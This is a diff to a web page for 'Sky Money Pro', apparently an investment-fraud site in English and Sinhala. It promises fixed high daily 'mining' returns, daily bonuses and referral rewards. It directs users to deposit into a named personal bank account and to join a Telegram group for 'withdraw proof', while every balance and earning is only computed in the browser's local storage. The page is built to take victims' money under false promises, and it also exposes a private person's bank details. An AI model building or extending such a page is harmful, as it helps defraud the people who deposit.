@@ -10,85 +10,123 @@
         :root {
             --primary: #0f172a; --secondary: #2563eb; --accent: #38bdf8;
             --light: #f8fafc; --white: #ffffff; --success: #10b981; --danger: #f43f5e;
+            --card-bg: #ffffff; --input-bg: #ffffff; --border-color: #e2e8f0;
             --card-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+            --text-muted: #64748b;
         }
-        body { margin: 0; background: var(--light); color: var(--primary); font-family: 'Inter', sans-serif; overflow-x: hidden; }
 
-        /* BANNER SLIDER SYSTEM */
-        .banner-container { width: 100%; height: 140px; overflow: hidden; position: relative; border-radius: 20px; box-shadow: var(--card-shadow); margin-bottom: 20px; }
-        .banner-wrapper { display: flex; width: 300%; height: 100%; animation: slide 10s infinite linear; }
-        .banner-slide { width: 100%; height: 100%; background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; position: relative; }
-        .banner-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.3); }
-        .banner-text { position: relative; z-index: 1; text-align: center; font-size: 14px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); padding: 0 10px; }
+        body.dark-mode {
+            --primary: #f8fafc; --secondary: #60a5fa; --light: #0f172a; 
+            --white: #1e293b; --card-bg: #1e293b; --input-bg: #334155; 
+            --border-color: #334155; --text-muted: #94a3b8;
+            --card-shadow: 0 10px 15px -3px rgba(0,0,0,0.5);
+            color: var(--primary);
+        }
+
+        body { margin: 0; background: var(--light); color: var(--primary); font-family: 'Inter', sans-serif; overflow-x: hidden; transition: background 0.3s, color 0.3s; }
+
+        .banner-container { width: calc(100% - 40px); height: 130px; overflow: hidden; position: relative; border-radius: 20px; margin: 20px auto; box-shadow: var(--card-shadow); }
+        .banner-wrapper { display: flex; width: 800%; height: 100%; animation: slide 24s infinite linear; }
+        .banner-slide { width: 100%; height: 100%; background-size: cover; background-position: center; }
         
         @keyframes slide {
-            0% { transform: translateX(0%); }
-            30% { transform: translateX(0%); }
-            33% { transform: translateX(-33.33%); }
-            63% { transform: translateX(-33.33%); }
-            66% { transform: translateX(-66.66%); }
-            96% { transform: translateX(-66.66%); }
+            0%, 8% { transform: translateX(0%); }
+            12.5%, 20.5% { transform: translateX(-12.5%); }
+            25%, 33% { transform: translateX(-25%); }
+            37.5%, 45.5% { transform: translateX(-37.5%); }
+            50%, 58% { transform: translateX(-50%); }
+            62.5%, 70.5% { transform: translateX(-62.5%); }
+            75%, 83% { transform: translateX(-75%); }
+            87.5%, 95.5% { transform: translateX(-87.5%); }
             100% { transform: translateX(0%); }
         }
 
-        /* UI COMPONENTS */
-        .header-box { background: linear-gradient(135deg, var(--primary), #1e293b); color: white; padding: 40px 20px 80px; border-radius: 0 0 40px 40px; }
-        .main-card { background: var(--white); margin: -60px 20px 20px; padding: 25px; border-radius: 24px; box-shadow: var(--card-shadow); text-align: center; }
+        #auth-screen { 
+            min-height: 100vh; 
+            background: linear-gradient(rgba(15, 23, 42, 0.8), rgba(15, 23, 42, 0.8)), url('https://images.unsplash.com/photo-1611974714024-4607caec1334?q=80&w=2070&auto=format&fit=crop'); 
+            background-size: cover; background-position: center; display: flex; align-items: center; justify-content: center;
+        }
+
+        .header-box { 
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
+            color: white; padding: 50px 20px 80px; border-radius: 0 0 45px 45px; 
+            text-align: center; position: relative; overflow: hidden;
+        }
+        body.dark-mode .header-box { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); }
+        .header-box::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(37, 99, 235, 0.1) 0%, transparent 70%); pointer-events: none;}
+
+        .theme-toggle-btn {
+            position: absolute; top: 20px; right: 20px;
+            background: rgba(255,255,255,0.15); border: none; width: 35px; height: 35px; 
+            border-radius: 50%; color: white; cursor: pointer; display: flex; 
+            align-items: center; justify-content: center; backdrop-filter: blur(5px); z-index: 20;
+        }
+
+        .main-card { background: var(--card-bg); margin: -60px 20px 20px; padding: 25px; border-radius: 24px; box-shadow: var(--card-shadow); text-align: center; position: relative; z-index: 10; transition: background 0.3s; }
         .btn-action { background: var(--secondary); color: white; border: none; padding: 12px 20px; border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid #e2e8f0; box-sizing: border-box; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border-color); background: var(--input-bg); color: var(--primary); box-sizing: border-box; transition: 0.3s; }
 
-        /* INVESTMENT CARDS (RESTORED STYLE) */
-        .inv-card { background: white; border-radius: 20px; padding: 18px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
+        .inv-card { background: var(--card-bg); border-radius: 20px; padding: 18px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 6px rgba(0,0,0,0.02); transition: background 0.3s; }
 
-        /* PROFILE CARD */
         .profile-card { background: linear-gradient(135deg, var(--secondary), #1d4ed8); color: white; margin: 20px; padding: 25px; border-radius: 24px; position: relative; }
         .action-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 0 20px 20px; text-align: center; }
-        .action-item { background: white; padding: 15px 5px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
+        .action-item { background: var(--card-bg); padding: 15px 5px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.02); transition: background 0.3s; }
 
-        /* TRANSACTION LIST */
-        .trx-item { background: white; margin-bottom: 10px; padding: 15px; border-radius: 18px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #f1f5f9; }
+        .trx-item { background: var(--card-bg); margin-bottom: 10px; padding: 15px; border-radius: 18px; display: flex; align-items: center; justify-content: space-between; border: 1px solid var(--border-color); transition: background 0.3s, border-color 0.3s; }
         .status-pill { font-size: 10px; font-weight: 800; padding: 3px 8px; border-radius: 6px; text-transform: uppercase; }
 
-        /* NAVIGATION */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; background: var(--white); display: flex; justify-content: space-around; align-items: center; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); z-index: 1000; }
-        .nav-item { color: #94a3b8; text-align: center; font-size: 11px; cursor: pointer; }
+        .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; background: var(--card-bg); display: flex; justify-content: space-around; align-items: center; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); z-index: 1000; transition: background 0.3s; }
+        .nav-item { color: var(--text-muted); text-align: center; font-size: 11px; cursor: pointer; transition: color 0.3s; }
         .nav-item.active { color: var(--secondary); font-weight: 700; }
 
-        .page { display: none; padding-bottom: 100px; animation: fadeIn 0.4s ease; }
+        .page { display: none; padding-bottom: 110px; animation: fadeIn 0.4s ease; }
         .page.active { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 20000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
+        .popup-card { background: var(--card-bg); transition: background 0.3s; }
+        .bank-info { background: var(--input-bg); padding: 15px; border-radius: 15px; margin-top: 10px; display: none; text-align: left; border-left: 5px solid var(--secondary); color: var(--primary); transition: background 0.3s; }
+        
+        .mining-status-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 18px; padding: 15px; margin-bottom: 15px; transition: background 0.3s, border-color 0.3s; }
+        .progress-container { background: var(--border-color); height: 6px; border-radius: 10px; margin: 12px 0; overflow: hidden; transition: background 0.3s; }
+        .progress-bar { background: var(--secondary); height: 100%; border-radius: 10px; transition: 0.5s; }
+        
+        .guide-box { background: var(--card-bg); padding: 20px; border-radius: 20px; margin-bottom: 25px; box-shadow: var(--card-shadow); transition: background 0.3s; }
+        .guide-step { display: flex; align-items: flex-start; margin-bottom: 12px; font-size: 12px; }
+        .guide-icon { background: var(--border-color); color: var(--secondary); width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; font-weight: bold; transition: background 0.3s; }
+        body.dark-mode .guide-icon { background: #334155; }
     </style>
 </head>
 <body>
 
 <div id="tg-popup" class="modal-overlay">
-    <div class="popup-card" style="background:white; padding:25px; border-radius:24px; text-align:center; width:80%;">
+    <div class="popup-card" style="padding:25px; border-radius:24px; text-align:center; width:80%;">
         <i class="fab fa-telegram" style="font-size: 50px; color: #0088cc; margin-bottom: 15px;"></i>
         <h3>Join Telegram Group</h3>
-        <p style="color:#64748b; font-size:14px;">දිනපතා Withdraw Proof බැලීමට අපගේ Telegram සමූහයට එක්වන්න.</p>
+        <p style="color:var(--text-muted); font-size:14px;">දිනපතා Withdraw Proof බැලීමට අපගේ Telegram සමූහයට එක්වන්න.</p>
         <a href="https://t.me/Sky_Money_Money_Pro" target="_blank" style="text-decoration:none;"><button class="btn-action" style="background:#0088cc;">JOIN NOW</button></a>
-        <button onclick="closePopup()" id="close-btn" style="margin-top:15px; border:none; background:none; color:#94a3b8; display:none; width:100%;">CLOSE (5s)</button>
+        <button onclick="closePopup()" id="close-btn" style="margin-top:15px; border:none; background:none; color:var(--text-muted); display:none; width:100%; cursor:pointer;">CLOSE (5s)</button>
     </div>
 </div>
 
 <div id="auth-screen">
-    <div style="text-align:center; padding: 50px 20px;">
-        <h1 style="font-family:'Poppins';">Sky Money <span style="color:var(--secondary);">Pro</span></h1>
-        <div style="background: white; padding: 30px; border-radius: 25px; box-shadow: var(--card-shadow);">
+    <div style="text-align:center; padding: 20px; width: 100%;">
+        <h1 style="font-family:'Poppins'; color: white; text-shadow: 0 4px 15px rgba(0,0,0,0.4); font-size: 32px;">Sky Money <span style="color:var(--accent);">Pro</span></h1>
+        <div style="background: rgba(255, 255, 255, 0.96); padding: 30px; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); max-width: 400px; margin: 0 auto; backdrop-filter: blur(10px);">
             <div id="login-form">
-                <input type="number" id="l-phone" placeholder="Phone Number">
-                <input type="password" id="l-pass" placeholder="Password">
+                <h3 style="margin-top:0; color: #0f172a;">Login</h3>
+                <input type="number" id="l-phone" placeholder="Phone Number" style="background:white; color:#0f172a; border-color:#e2e8f0;">
+                <input type="password" id="l-pass" placeholder="Password" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <button class="btn-action" onclick="login()">LOGIN</button>
-                <p onclick="document.getElementById('login-form').style.display='none';document.getElementById('reg-form').style.display='block';" style="font-size:12px; margin-top:15px; color:var(--secondary);">Create Account</p>
+                <p onclick="document.getElementById('login-form').style.display='none';document.getElementById('reg-form').style.display='block';" style="font-size:12px; margin-top:15px; color:var(--secondary); cursor: pointer; font-weight: 600;">Don't have an account? Register</p>
             </div>
             <div id="reg-form" style="display:none;">
-                <input type="number" id="r-phone" placeholder="Phone Number">
-                <input type="password" id="r-pass" placeholder="Password">
-                <input type="text" id="r-ref" placeholder="Referral Code">
+                <h3 style="margin-top:0; color: #0f172a;">Create Account</h3>
+                <input type="number" id="r-phone" placeholder="Phone Number" style="background:white; color:#0f172a; border-color:#e2e8f0;">
+                <input type="password" id="r-pass" placeholder="Password" style="background:white; color:#0f172a; border-color:#e2e8f0;">
+                <input type="text" id="r-ref" placeholder="Referral Code (Optional)" style="background:white; color:#0f172a; border-color:#e2e8f0;">
                 <button class="btn-action" onclick="register()">REGISTER</button>
-                <p onclick="location.reload()" style="font-size:12px; margin-top:15px;">Back to Login</p>
+                <p onclick="location.reload()" style="font-size:12px; margin-top:15px; cursor: pointer; font-weight: 600; color:#0f172a;">Back to Login</p>
             </div>
         </div>
     </div>
@@ -97,47 +135,62 @@
 <div id="main-app" style="display:none;">
     
     <section id="home" class="page active">
-        <div class="header-box"><h2>Sky Money Pro</h2></div>
+        <div class="header-box">
+            <button class="theme-toggle-btn" onclick="toggleTheme()">
+                <i class="fas fa-moon" id="theme-icon"></i>
+            </button>
+            <h2 style="font-family:'Poppins'; margin:0; font-size: 28px; letter-spacing: 1px;">Sky Money <span style="color:var(--accent);">Pro</span></h2>
+            <p style="font-size: 11px; opacity: 0.9; font-weight: 300; margin-top: 5px;">THE MOST TRUSTED MINING PLATFORM</p>
+        </div>
+
         <div class="main-card">
-            <div class="banner-container">
-                <div class="banner-wrapper">
-                    <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/digital-money-transfer-technology-background_1017-17454.jpg');">
-                        <div class="banner-overlay"></div>
-                        <div class="banner-text">Sky Money Pro Mining<br>Start Today & Earn Daily</div>
-                    </div>
-                    <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/gradient-crypto-mining-concept_23-2149156557.jpg');">
-                        <div class="banner-overlay"></div>
-                        <div class="banner-text">Fast Withdrawals<br>Secure & Trusted Platform</div>
-                    </div>
-                </div>
-            </div>
-
-            <small>WALLET BALANCE</small>
-            <h1 id="bal-text">Rs. 0</h1>
-            <button onclick="getDailyBonus()" class="btn-action" style="width:auto; border-radius:30px; padding: 10px 25px;">CLAIM Rs. 200 BONUS</button>
-
-            <div class="banner-container" style="height: 100px; margin-top: 20px;">
-                <div class="banner-wrapper">
-                    <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/realistic-money-background_23-2149120688.jpg');">
-                        <div class="banner-overlay"></div>
-                        <div class="banner-text">Refer Friends<br>Earn Rs. 100 per invite</div>
-                    </div>
-                    <div class="banner-slide" style="background-image: url('https://img.freepik.com/free-vector/gradient-stock-market-concept_23-2149166910.jpg');">
-                        <div class="banner-overlay"></div>
-                        <div class="banner-text">24/7 Support<br>Join our Community</div>
-                    </div>
-                </div>
-            </div>
+            <small style="font-weight:600; color:var(--text-muted); letter-spacing: 1px;">TOTAL WALLET BALANCE</small>
+            <h1 id="bal-text" style="font-size:36px; margin:10px 0;">Rs. 0</h1>
+            <button onclick="getDailyBonus()" class="btn-action" style="width:auto; border-radius:30px; padding: 12px 30px; background: linear-gradient(135deg, var(--secondary), var(--accent)); box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);">
+                <i class="fas fa-gift"></i> CLAIM Rs. 200 BONUS
+            </button>
         </div>
 
         <div style="padding: 0 20px;">
-            <h3>Active Mining Plans</h3>
-            <div id="active-mining-list"></div>
+            <div class="guide-box">
+                <h3 style="margin-top:0; font-size: 15px; color: var(--secondary); border-bottom: 1px solid var(--border-color); padding-bottom: 10px;">
+                    <i class="fas fa-rocket"></i> මුදල් උපයන්නේ කෙසේද?
+                </h3>
+                <div class="guide-step">
+                    <div class="guide-icon">1</div>
+                    <div><b>Invest:</b> Market එකෙන් ඔබට ගැලපෙන සැලසුමක් තෝරා ආයෝජනය කරන්න.</div>
+                </div>
+                <div class="guide-step">
+                    <div class="guide-icon">2</div>
+                    <div><b>Mining:</b> දිනපතා ලාභය Mining Status කොටසේ ස්වයංක්‍රීයව එකතු වේ.</div>
+                </div>
+                <div class="guide-step" style="margin-bottom:0;">
+                    <div class="guide-icon">3</div>
+                    <div><b>Withdraw:</b> අවම Rs. 1000 වූ සැණින් බැංකුවට හෝ Binance වෙත ලබාගන්න.</div>
+                </div>
+            </div>
+
+            <h3 style="font-size:16px; margin-bottom: 15px;"><i class="fas fa-chart-line"></i> Active Mining Status</h3>
+            <div id="mining-status-area"></div>
+
+            <div class="banner-container">
+                <div class="banner-wrapper">
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1518458028785-8fbcd101ebb9?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1579621970795-87faff2f916a?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1621932953912-0b6d8bb2c54e?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1563013544-824ae1b704d3?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1604594849806-d4b57c27988a?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1642543492481-44e81e3914a7?auto=format&fit=crop&w=800');"></div>
+                    <div class="banner-slide" style="background-image: url('https://images.unsplash.com/photo-1642751227513-94162d52e952?auto=format&fit=crop&w=800');"></div>
+                </div>
+            </div>
         </div>
     </section>
 
     <section id="market" class="page">
-        <h3 style="padding:20px;">Investment Plans</h3>
+        <h3 style="padding:20px;">Monthly Investment Plans</h3>
+        <p style="padding:0 20px; font-size:12px; color:var(--text-muted);">සටහන: දිනපතා ලාභය පෙන්වන අතර දින 30 කට පසු සම්පූර්ණ මුදල Wallet එකට එකතු වේ.</p>
         <div style="padding: 0 20px;" id="market-list"></div>
     </section>
 
@@ -168,8 +221,33 @@
         <div style="padding:20px;"><button class="btn-action" style="background:#ef4444;" onclick="logout()">LOGOUT</button></div>
     </section>
 
-    <section id="deposit" class="page"><div style="padding:20px;"><h3>Deposit</h3><input type="number" id="d-amt" placeholder="Amount"><input type="text" id="d-ref" placeholder="Transaction ID"><button class="btn-action" onclick="submitReq('deposit')">Submit</button></div></section>
-    <section id="withdraw" class="page"><div style="padding:20px;"><h3>Withdraw</h3><input type="number" id="w-amt" placeholder="Amount (Min 1500)"><input type="text" id="w-bin" placeholder="Binance Pay ID / Bank"><button class="btn-action" onclick="submitReq('withdraw')">Submit</button></div></section>
+    <section id="deposit" class="page">
+        <div style="padding:20px;">
+            <h3>Deposit</h3>
+            <button class="btn-action" onclick="toggleBank()" style="background: var(--primary); color: var(--light); margin-bottom: 10px;">DEPOSIT METHOD (BANK DETAILS)</button>
+            <div id="bank-box" class="bank-info">
+                <strong>Account Number:</strong> 94591300<br>
+                <strong>Bank:</strong> BOC<br>
+                <strong>Name:</strong> R.A.P.V.LAKSHAN
+            </div>
+            <input type="number" id="d-amt" placeholder="Deposit Amount">
+            <input type="number" id="d-reg-phone" placeholder="Register Phone Number">
+            <input type="text" id="d-ref" placeholder="Transaction ID">
+            <small style="color:var(--text-muted);">Upload Transaction Slip:</small>
+            <input type="file" id="d-slip" accept="image/*" style="border:none; padding:10px 0; color:var(--text-muted);">
+            <button class="btn-action" onclick="submitReq('deposit')">Submit Deposit</button>
+        </div>
+    </section>
+
+    <section id="withdraw" class="page">
+        <div style="padding:20px;">
+            <h3>Withdraw</h3>
+            <p style="font-size: 12px; color: var(--text-muted);">Limit: Rs. 1,000.00 - Rs. 5,000.00</p>
+            <input type="number" id="w-amt" placeholder="Amount (1000 - 5000)">
+            <input type="text" id="w-bin" placeholder="Binance Pay ID / Bank Details">
+            <button class="btn-action" onclick="submitReq('withdraw')">Submit Withdrawal</button>
+        </div>
+    </section>
 
     <nav class="nav-bar">
         <div class="nav-item active" onclick="nav('home', this)"><i class="fas fa-home"></i><br>Home</div>
@@ -186,16 +264,38 @@
     let users = JSON.parse(localStorage.getItem(USERS_KEY)) || [];
     let currentUser = JSON.parse(sessionStorage.getItem(SESSION_KEY));
 
+    const themeBtn = document.getElementById('theme-icon');
+    if (localStorage.getItem('theme') === 'dark') {
+        document.body.classList.add('dark-mode');
+        themeBtn.classList.replace('fa-moon', 'fa-sun');
+    }
+
+    function toggleTheme() {
+        document.body.classList.toggle('dark-mode');
+        if (document.body.classList.contains('dark-mode')) {
+            localStorage.setItem('theme', 'dark');
+            themeBtn.classList.replace('fa-moon', 'fa-sun');
+        } else {
+            localStorage.setItem('theme', 'light');
+            themeBtn.classList.replace('fa-sun', 'fa-moon');
+        }
+    }
+
     const plans = [
-        { name: 'Mini Saver', cost: 500, daily: 60, color: '#3b82f6' },
-        { name: 'Starter', cost: 1000, daily: 140, color: '#f59e0b' },
-        { name: 'Bronze', cost: 2500, daily: 400, color: '#10b981' },
-        { name: 'Silver', cost: 5000, daily: 850, color: '#8b5cf6' },
-        { name: 'Gold', cost: 10000, daily: 1800, color: '#ec4899' },
-        { name: 'Platinum', cost: 20000, daily: 4000, color: '#ef4444' },
-        { name: 'Business', cost: 35000, daily: 7500, color: '#06b6d4' },
-        { name: 'VIP Elite', cost: 50000, daily: 12000, color: '#000' }
+        { name: 'Mini Saver', cost: 500, daily: 30, color: '#3b82f6' },
+        { name: 'Starter', cost: 1000, daily: 70, color: '#f59e0b' },
+        { name: 'Bronze', cost: 2500, daily: 180, color: '#10b981' },
+        { name: 'Silver', cost: 5000, daily: 380, color: '#8b5cf6' },
+        { name: 'Gold', cost: 10000, daily: 800, color: '#ec4899' },
+        { name: 'Platinum', cost: 20000, daily: 1800, color: '#ef4444' },
+        { name: 'Business', cost: 35000, daily: 3300, color: '#06b6d4' },
+        { name: 'VIP Elite', cost: 50000, daily: 5000, color: '#000' }
     ];
+
+    function toggleBank() {
+        let box = document.getElementById('bank-box');
+        box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    }
 
     function save() { localStorage.setItem(USERS_KEY, JSON.stringify(users)); }
 
@@ -222,19 +322,47 @@
 
     function updateUI() {
         const user = users.find(u => u.phone === currentUser.phone);
+        const now = Date.now();
+        
+        user.activePlans.forEach((p, index) => {
+            const daysPassed = Math.floor((now - p.startTime) / 86400000);
+            p.collected = Math.min(daysPassed, 30) * p.daily;
+            if(daysPassed >= 30 && !p.matured) {
+                user.bal += p.collected;
+                p.matured = true;
+            }
+        });
+
         document.getElementById('bal-text').innerText = "Rs. " + user.bal.toLocaleString();
         document.getElementById('p-bal').innerText = "Rs. " + user.bal.toLocaleString();
         document.getElementById('u-phone').innerText = user.phone;
         document.getElementById('u-ref-code').innerText = user.refCode;
 
-        // Render Active Mining
-        document.getElementById('active-mining-list').innerHTML = user.activePlans.map(p => `
-            <div style="background:white; padding:15px; border-radius:15px; margin-bottom:10px; border-left:5px solid var(--success); display:flex; justify-content:space-between;">
-                <b>${p.name} Miner</b> <span style="color:var(--success)">+Rs. ${p.daily}</span>
-            </div>
-        `).join('') || '<p style="text-align:center; color:#94a3b8;">No active plans.</p>';
+        document.getElementById('mining-status-area').innerHTML = user.activePlans.map(p => {
+            const daysPassed = Math.floor((now - p.startTime) / 86400000);
+            const totalReturn = p.daily * 30;
+            const progress = (Math.min(daysPassed, 30) / 30) * 100;
 
-        // Render Market (Correct Plan Cards)
+            return `
+            <div class="mining-status-card">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <b style="color:var(--secondary); font-size:15px;">${p.name} Package</b>
+                    <span style="font-size:10px; font-weight:bold; color:white; background:${p.matured ? '#10b981':'#38bdf8'}; padding:4px 10px; border-radius:20px;">
+                        ${p.matured ? 'COMPLETED' : 'MINING NOW'}
+                    </span>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar" style="width: ${progress}%"></div>
+                </div>
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size:11px;">
+                    <div style="color:var(--text-muted);">Daily Profit: <b>Rs. ${p.daily}</b></div>
+                    <div style="color:var(--text-muted); text-align:right;">Days: <b>${Math.min(daysPassed, 30)}/30</b></div>
+                    <div style="color:var(--success); font-weight:700;">Earned: Rs. ${p.collected}</div>
+                    <div style="color:var(--primary); font-weight:700; text-align:right;">Total: Rs. ${totalReturn}</div>
+                </div>
+            </div>`;
+        }).join('') || '<div style="text-align:center; padding:20px; color:var(--text-muted); font-size:13px; border:1px dashed var(--border-color); border-radius:15px;">තවමත් කිසිදු ආයෝජනයක් සිදුකර නැත.</div>';
+
         document.getElementById('market-list').innerHTML = plans.map(p => `
             <div class="inv-card" style="border-left: 5px solid ${p.color};">
                 <div><b>${p.name}</b><br><small>Cost: ${p.cost} | Daily: ${p.daily}</small></div>
@@ -242,34 +370,47 @@
             </div>
         `).join('');
 
-        // Render History
         document.getElementById('trans-history').innerHTML = user.requests.map(r => `
             <div class="trx-item">
                 <div><b>${r.type.toUpperCase()}</b><br><small>${new Date(r.time).toLocaleDateString()}</small></div>
                 <div style="text-align:right;"><b>Rs. ${r.amount}</b><br><span class="status-pill" style="color:${r.status==='pending'?'#f59e0b':'#10b981'}">${r.status}</span></div>
             </div>
-        `).join('') || '<p style="text-align:center;">No history.</p>';
-    }
-
-    function submitReq(type) {
-        let amt = type === 'deposit' ? document.getElementById('d-amt').value : document.getElementById('w-amt').value;
-        let proof = type === 'deposit' ? document.getElementById('d-ref').value : document.getElementById('w-bin').value;
-        if(!amt || !proof) return alert("Fill all fields");
-        let user = users.find(u => u.phone === currentUser.phone);
-        user.requests.unshift({ type, amount: amt, status: 'pending', time: Date.now(), trxID: type==='deposit'?proof:null, payID: type==='withdraw'?proof:null });
-        save(); updateUI(); alert("Submitted!"); nav('profile');
+        `).join('') || '<p style="text-align:center; font-size:12px; color:var(--text-muted);">No history found.</p>';
+        
+        save();
     }
 
     function buyPlan(cost, daily, name) {
         let user = users.find(u => u.phone === currentUser.phone);
         if(user.bal < cost) return alert("Low Balance");
-        user.bal -= cost; user.activePlans.push({ name, daily });
-        save(); updateUI(); alert(name + " Started!"); nav('home');
+        user.bal -= cost; 
+        user.activePlans.push({ name, daily, startTime: Date.now(), collected: 0, matured: false });
+        save(); updateUI(); alert(name + " ආයෝජනය සාර්ථකයි! දින 30 කින් ලාභය ලැබෙනු ඇත."); nav('home');
+    }
+
+    function submitReq(type) {
+        let user = users.find(u => u.phone === currentUser.phone);
+        if(type === 'deposit') {
+            let amt = document.getElementById('d-amt').value;
+            let regPhone = document.getElementById('d-reg-phone').value;
+            let trx = document.getElementById('d-ref').value;
+            let slip = document.getElementById('d-slip').value;
+            if(!amt || !regPhone || !trx || !slip) return alert("කරුණාකර සියලු විස්තර ලබා දෙන්න.");
+            user.requests.unshift({ type, amount: amt, status: 'pending', time: Date.now(), trxID: trx, regPhone: regPhone });
+        } else {
+            let amt = document.getElementById('w-amt').value;
+            let bin = document.getElementById('w-bin').value;
+            if(amt < 1000 || amt > 5000) return alert("අවම 1000, උපරිම 5000.");
+            if(!bin) return alert("ගෙවීම් තොරතුරු ඇතුළත් කරන්න.");
+            if(user.bal < amt) return alert("ප්‍රමාණවත් ශේෂයක් නොමැත.");
+            user.requests.unshift({ type, amount: amt, status: 'pending', time: Date.now(), payID: bin });
+        }
+        save(); updateUI(); alert("ඉල්ලීම සාර්ථකව යොමු කරන ලදී!"); nav('profile');
     }
 
     function getDailyBonus() {
         let user = users.find(u => u.phone === currentUser.phone);
-        if(Date.now() - user.lastBonus < 86400000) return alert("Wait 24h");
+        if(Date.now() - user.lastBonus < 86400000) return alert("නැවත ලබා ගැනීමට පැය 24ක් ඉන්න.");
         user.bal += 200; user.lastBonus = Date.now();
         save(); updateUI(); alert("Daily Bonus Claimed!");
     }
